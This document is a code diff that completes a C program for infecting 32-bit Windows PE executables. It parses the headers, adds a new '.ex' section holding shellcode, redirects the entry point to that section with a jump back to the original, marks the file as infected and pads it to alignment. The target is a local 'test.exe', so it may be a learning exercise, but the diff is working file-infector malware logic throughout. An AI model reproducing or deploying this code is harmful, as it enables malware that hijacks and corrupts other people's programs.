@@ -7,7 +7,7 @@
 #include <malloc.h>
 #include <string.h>
 
-void ReadOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
+inline void ReadOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
         puts("Error when set file pointor!");
         exit(1);
@@ -18,7 +18,7 @@ void ReadOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
     }
 }
 
-void WriteOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
+inline void WriteOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
         puts("Error when set file pointor!");
         exit(1);
@@ -29,8 +29,19 @@ void WriteOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
     }
 }
 
+inline void SetFileSize(HANDLE hFile, long size) {
+    if(SetFilePointer(hFile, size, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
+        puts("Error when set file pointor!");
+        exit(1);
+    }
+    if(SetEndOfFile(hFile) == FALSE) {
+        puts("Error when modify size!");
+        exit(1);
+    }
+}
+
 #define BUF_SIZE (1 << 20)
-#define CODE_SIZE (1 << 8)
+#define CODE_SIZE 12
 
 const char *TARGET = ".\\test.exe";
 char buf[BUF_SIZE];
@@ -59,20 +70,25 @@ HANDLE OpenTarget() {
 IMAGE_DOS_HEADER dosHdr;
 IMAGE_FILE_HEADER fileHdr;
 IMAGE_OPTIONAL_HEADER32 optHdr;
+IMAGE_SECTION_HEADER lasSecHdr, newSecHdr;
 
 void InfectTarget(HANDLE hFile) {
+    puts("Init Header Pointer...");
     PIMAGE_DOS_HEADER pDosHdr = &dosHdr;
     PIMAGE_FILE_HEADER pFileHdr = &fileHdr;
     PIMAGE_OPTIONAL_HEADER32 pOptHdr = &optHdr;
+    PIMAGE_SECTION_HEADER pLasSecHdr = &lasSecHdr;
+    PIMAGE_SECTION_HEADER pNewSecHdr = &newSecHdr;
 //======================================================================
+    puts("Get Headers and Check...");
     // Get DOS Header
     ReadOffset(
         hFile, 0, FILE_BEGIN, 
         (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
     );
     // Check infected
-    if(pOptDos->e_res[0] == 0x1234) {
-        puts("Target infected!");
+    if(pDosHdr->e_res[0] == 0x1234) {
+        puts("Error: Target has been infected!");
         exit(1);
     }
     // Check Signature
@@ -82,7 +98,7 @@ void InfectTarget(HANDLE hFile) {
         (PVOID)&pe00, sizeof(DWORD)
     );
     if(pe00 != 0x00004550) {
-        puts("Not a pe file!");
+        puts("Error: Not a pe file!");
         exit(1);
     }
     // Get File Header
@@ -98,7 +114,7 @@ void InfectTarget(HANDLE hFile) {
         sizeof(IMAGE_OPTIONAL_HEADER32) 
     );
     if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
-        puts("Not a 32 bits exe!");
+        puts("Error: Not a 32 bits exe!");
         exit(1);
     }
     // Check Headers Space
@@ -109,27 +125,87 @@ void InfectTarget(HANDLE hFile) {
         + pFileHdr->SizeOfOptionalHeader;
     long alignSize = pOptHdr->SizeOfHeaders;
     if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
-        puts("No space to insert a new sections!");
+        puts("Error: No space to insert a new sections!");
         exit(1);
     }
+    // Get Last Section Header
+    ReadOffset(
+        hFile, currentSize - sizeof(IMAGE_SECTION_HEADER), FILE_BEGIN, 
+        (PVOID)&lasSecHdr, sizeof(IMAGE_SECTION_HEADER)
+    );
 //======================================================================
-    // Start Infecting
-    // Set Infected tag
-    pDosHdr->e_res[0] = 0x1234;
-    // Get old entry VA
+    puts("Prepare to infect...");
+    // Get align
+    long fileAlign = pOptHdr->FileAlignment;
+    long secAlign = pOptHdr->SectionAlignment; 
+    // Set old entry VA
     long oldVA = pOptHdr->AddressOfEntryPoint + pOptHdr->ImageBase;
     long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
     *jmpPoint = oldVA;
+    // Calc New Section raw
+    long rawNewSec = pLasSecHdr->PointerToRawData + pLasSecHdr->SizeOfRawData;
+    // Calc New Section rva 
+    long lasVirSize = pLasSecHdr->Misc.VirtualSize;
+    if(lasVirSize % secAlign != 0) lasVirSize = (lasVirSize / secAlign + 1) * secAlign;
+    long rvaNewSec = pLasSecHdr->VirtualAddress + lasVirSize;
+    // Calc New Section raw size
+    long raw_size = CODE_SIZE;
+    if(CODE_SIZE % fileAlign != 0) raw_size = (CODE_SIZE / fileAlign + 1) * fileAlign;
+    // Calc New Section image size
+    int vir_size = CODE_SIZE;
+    if(CODE_SIZE % secAlign != 0) vir_size = (CODE_SIZE / secAlign + 1) * secAlign;
     // Set New Section Header
-
-    // Set New Section
-
-    // Saved to file
+    char *sName = pNewSecHdr->Name;
+    sName[0] = '.', sName[1] = 'e', sName[2] = 'x';
+    pNewSecHdr->Misc.VirtualSize = CODE_SIZE;
+    pNewSecHdr->VirtualAddress = rvaNewSec;
+    pNewSecHdr->SizeOfRawData = raw_size;
+    pNewSecHdr->PointerToRawData = rawNewSec;
+    pNewSecHdr->PointerToRelocations = 0;
+    pNewSecHdr->PointerToLinenumbers = 0;
+    pNewSecHdr->NumberOfRelocations = 0;
+    pNewSecHdr->NumberOfLinenumbers = 0;
+    pNewSecHdr->Characteristics = IMAGE_SCN_CNT_CODE;
+    // Set Infected tag
+    pDosHdr->e_res[0] = 0x1234;
+    // Fix File Header
+    pFileHdr->NumberOfSections++;
+    // Fix Optional Header
+    pOptHdr->AddressOfEntryPoint = rvaNewSec;
+    pOptHdr->SizeOfImage = rvaNewSec + vir_size;
+//======================================================================
+    puts("Infect the file...");
+    // Saved Dos Header
     WriteOffset(
         hFile, 0, FILE_BEGIN,
         (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
     );
-
+    // Saved File Header
+    WriteOffset(
+        hFile, pDosHdr->e_lfanew + 0x4, FILE_BEGIN,
+        (PVOID)&fileHdr, sizeof(IMAGE_FILE_HEADER)
+    );
+    // Saved Optional Header
+    WriteOffset(
+        hFile, 0, FILE_CURRENT,
+        (PVOID)&optHdr,
+        sizeof(IMAGE_OPTIONAL_HEADER32)
+    );
+    // Saved New Section Header
+    WriteOffset(
+        hFile, currentSize, FILE_BEGIN,
+        (PVOID)&newSecHdr,
+        sizeof(IMAGE_SECTION_HEADER)
+    );
+    // Saved New Section
+    WriteOffset(
+        hFile, rawNewSec, FILE_BEGIN,
+        shellCode, CODE_SIZE
+    );
+    // Alignment
+    SetFileSize(hFile, rawNewSec + raw_size);
+//======================================================================
+    puts("Infect success!");
 }
 
 int main() {
